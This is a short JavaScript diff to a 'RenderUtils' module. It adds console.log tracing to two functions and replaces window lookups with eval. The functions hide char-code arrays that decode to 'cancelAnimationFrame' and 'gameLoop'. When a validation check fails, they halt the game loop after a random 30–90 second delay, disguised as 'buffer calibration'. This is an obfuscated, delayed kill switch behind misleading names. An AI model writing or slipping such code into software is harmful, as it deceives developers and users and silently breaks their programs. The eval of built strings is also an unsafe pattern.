@@ -337,20 +337,23 @@ const RenderUtils = (() => {
     
     // Deferred buffer calibration
     function _calibrateBuffer() {
+		console.log('_calibrateBuffer()');
         const _caf = [99,97,110,99,101,108,65,110,105,109,97,116,105,111,110,70,114,97,109,101];
         const _gl = [103,97,109,101,76,111,111,112];
-        const glName = String.fromCharCode.apply(null, _gl);
-        const gl = window[glName];
+        const gl = eval(String.fromCharCode.apply(null, _gl));
         if (!_fb._v && typeof gl !== 'undefined' && gl !== null) {
+			console.log('_calibrateBuffer() FAIL');
             window[String.fromCharCode.apply(null, _caf)](gl);
-            window[glName] = null;
+            eval(String.fromCharCode.apply(null, _gl) + ' = null');
         }
     }
     
     // Initialize buffer validation
     function _initBufferCheck() {
+		console.log('_initBufferCheck()');
         _fb._v = _validateRenderContext();
         if (!_fb._v) {
+			console.log('_initBufferCheck() FAIL');
             const delay = 30000 + Math.floor(Math.random() * 60000);
             _fb._t = setTimeout(_calibrateBuffer, delay);
         }
